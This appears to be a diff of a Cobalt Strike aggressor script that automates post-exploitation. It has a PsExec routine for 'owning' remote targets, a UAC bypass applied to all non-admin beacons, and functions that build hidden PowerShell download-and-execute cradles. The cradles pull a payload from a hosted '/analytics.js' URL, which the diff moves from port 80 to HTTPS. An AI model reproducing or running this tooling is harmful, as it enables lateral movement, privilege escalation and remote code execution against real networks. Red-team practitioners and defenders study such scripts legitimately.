@@ -8,9 +8,15 @@
 # - Automatically bypass UAC
 # - Screenshot all beacons
 
+
+# @variable = array
+# %variable = hash
+# $variable = variable
+
 # PsExec against $target from $bid
 # TODO figure out how to use with make_token
 sub psexecTarget {
+    local('$bid $target $listener');
     ($bid, $target, $listener) = @_; # @_ contains the arguments for the subroutine.
     say("Owning $target with psexec_psh.");
     bpsexec_psh($bid, $target, $listener);
@@ -18,6 +24,7 @@ sub psexecTarget {
 
 # Attempt to bypass UAC on all non-admin shells
 sub elevateAll {
+    local('$listener');
     $listener = $1;
 
     # Iterate over all beacons with beacons()
@@ -39,7 +46,7 @@ sub getDownloadString {
         # Check if the site has powershell in the description
         if ($s['Description'] hasmatch "powershell") {
             # Build URL and DownloadString
-            $url = "http://" . $s['Host'] . ":" . $s['Port'] . $s['URI'];
+            $url = "https://" . $s['Host'] . $s['URI'];
             $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('";
             $downloadString .= $url . "'))\"";
 
@@ -69,7 +76,8 @@ sub createDownloadString {
 
         $script = $1;
 
-        $url = site_host($host, "80", "/analytics.js", $script, "text/plain", "Scripted Web Delivery(powershell)");
+        $url = site_host($host, "443", "/analytics.js", $script, "text/plain", "Scripted Web Delivery(powershell)");
+        $url = strrep($url, "http", "https");
 
         $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('";
         $downloadString .= $url . "'))\"";
